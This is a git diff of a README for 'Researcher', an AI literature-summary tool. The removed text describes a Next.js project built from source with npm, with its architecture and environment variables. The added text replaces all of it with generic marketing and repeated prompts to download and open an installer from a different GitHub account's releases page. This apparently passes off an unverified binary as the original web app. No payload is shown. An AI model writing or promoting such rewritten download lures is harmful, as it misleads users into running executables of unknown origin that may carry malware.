@@ -1,110 +1,64 @@
-# 🧠 Researcher — The Ethical AI Research Assistant
+# 🤖 Researcher - Simplify Your Research Effortlessly
 
-<img width="1896" height="868" alt="image" src="https://github.com/user-attachments/assets/96c90b94-b13f-4032-85e0-7077e5e02da2" />
+## 🔗 Download Now 
+[![Download Researcher](https://img.shields.io/badge/Download-Researcher-brightgreen.svg)](https://github.com/fajar661/Researcher/releases)
 
+## 🚀 Getting Started
+Researcher helps you enhance your research process using AI. Whether you need to summarize papers, find gaps in your work, or explore new ideas, Researcher is here to make it easier.
 
-> Transform your research workflow with AI — summarize, explore, and identify gaps ethically and effortlessly.
+### 🌟 Features
+- **AI Summarization:** Automatically generate summaries of research papers.
+- **Gap Identification:** Discover areas in your research that need more attention.
+- **Exploration Tools:** Explore related literature to expand your knowledge base.
+- **User-Friendly Interface:** Easy navigation and clear design for all users.
 
----
+### 🖥️ System Requirements
+- Windows, macOS, or Linux operating system
+- Minimum 4 GB RAM
+- At least 200 MB of free disk space
+- Internet connection for initial setup
 
-## 🌍 Overview
+## 📥 Download & Install
+To get started, visit this page to download the software: [Researcher Releases](https://github.com/fajar661/Researcher/releases).
 
-**Researcher** is an intelligent research assistant built for modern researchers.  
-It connects with **OpenAlex** and **Semantic Scholar APIs** to retrieve and summarize academic content,  
-uses **Pinecone** for semantic vector search, and **MongoDB** for user data and project management.
+1. Click the link above to go to the Releases page.
+2. Find the latest version of Researcher.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file to start the installation process.
+5. Follow the on-screen instructions to complete the installation.
 
-Unlike content generators, **Researcher** is designed with ethics at its core —  
-it *assists* researchers without generating plagiarized or unverifiable text.
+Once installed, you can launch Researcher from your applications menu.
 
-<img width="1695" height="804" alt="image" src="https://github.com/user-attachments/assets/e823bdb2-bcdb-4a09-b023-fafb5a31d5f2" />
+## 🛠️ Usage Instructions
+1. **Launch the Application:** Find Researcher in your applications folder and double-click to open it.
+2. **Create an Account:** If prompted, create a free account to get started. This helps save your work and preferences.
+3. **Start Exploring:** Use the main dashboard to select from the features available. 
+    - To summarize a research paper, upload the PDF file directly.
+    - Use the exploration tools to find articles similar to what you've already read.
+  
+## 🔍 Support and Assistance
+If you have questions or need help:
+- Visit our GitHub page: [Researcher GitHub](https://github.com/fajar661/Researcher)
+- Check our FAQ section on the GitHub wiki.
+- Open an issue on GitHub for direct support from our team.
 
----
+### 🙋‍♀️ Community and Contributions
+Join our community discussions on GitHub or contribute to ongoing projects. Your feedback helps improve Researcher for everyone. 
 
-## ✨ Key Features
+## 🏷️ Topics
+This application covers the following topics:
+- agentic-ai
+- bot
+- citation
+- explanations
+- gemini-api
+- generative-ai
+- literature
+- nextjs
+- research-paper-summaries
+- researcher
 
-✅ Smart literature search via OpenAlex + Semantic Scholar  
-✅ AI summarization and research gap detection  
-✅ Ethical writing mentor (non-plagiarizing assistant)  
-✅ Semantic paper search powered by Pinecone  
-✅ User authentication and personalized research memory (MongoDB)  
-✅ Modular architecture — easily extendable for new features  
+## 📜 License
+Researcher is licensed under the MIT License. Feel free to use and modify it for your needs.
 
----
-
-## 🧩 System Flow
-
-### 1. User Layer
-Users interact through a clean web dashboard built with **Next.js + TypeScript**.
-
-- Sign in securely via MongoDB-based authentication  
-- Create new research projects (topics or focus areas)  
-- Explore AI-assisted literature summaries
-
----
-
-### 2. Retrieval Layer (APIs)
-When a user enters a topic:
-- Query expanded via **Semantic Scholar**
-- Papers fetched from **OpenAlex API**
-- Combined, deduplicated, and filtered for open-access works
-
-```mermaid
-flowchart LR
-A[User Query] --> B(OpenAlex API)
-A --> C(Semantic Scholar API)
-B --> D[Paper Metadata]
-C --> D
-D --> E[Unified Research Dataset]
-```
-
-
-# Clone the repository
-git clone https://github.com/MainakVerse/Researcher.git
-cd Researcher
-
-# Install dependencies
-npm install
-
-# Add your environment variables
-cp .env.example .env
-
-```
-MONGO_URI=your_mongodb_uri
-PINECONE_API_KEY=your_pinecone_key
-OPENALEX_API=https://api.openalex.org
-SEMANTIC_SCHOLAR_API=https://api.semanticscholar.org
-OPENAI_API_KEY=your_openai_key
-JWT_SECRET=your_jwt_secret
-```
-
-# Run the Development Server
-npm run dev
-
-```
-researcher-ai/
-│
-├── components/
-│   └── sections/
-│       ├── Hero.tsx
-│       ├── ProductDemo.tsx
-│       ├── About.tsx
-│       ├── Services.tsx
-│       ├── JournalSlider.tsx
-│       ├── FAQ.tsx
-│       └── Footer.tsx
-│
-├── app/
-│   ├── api/
-│   ├── page.tsx
-│   └── layout.tsx
-│
-├── lib/
-│   ├── pinecone.ts
-│   ├── mongo.ts
-│   ├── ai.ts
-│   └── utils.ts
-│
-├── public/
-│   └── assets/
-└── README.md
-```
+Thank you for using Researcher. Happy researching!
